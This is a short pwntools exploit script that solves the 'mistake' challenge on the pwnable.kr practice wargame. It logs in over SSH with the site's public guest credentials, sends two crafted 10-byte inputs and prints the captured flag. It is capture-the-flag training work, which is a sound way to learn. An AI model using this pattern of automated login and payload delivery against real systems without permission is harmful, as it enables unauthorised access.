#!/bin/python3
from pwn import *

# settings:
context.log_level = 'info'

# getting process:
s = ssh(user="mistake", host="pwnable.kr", port=2222, password="guest")
io = s.process("./mistake")

# sending payload:
io.sendline(10*b"B")
io.sendline(10*b"C")

# getting flag:
io.recvuntil(b"OK\n")
flag = io.recvline().decode()
log.success(f"flag: {flag}")
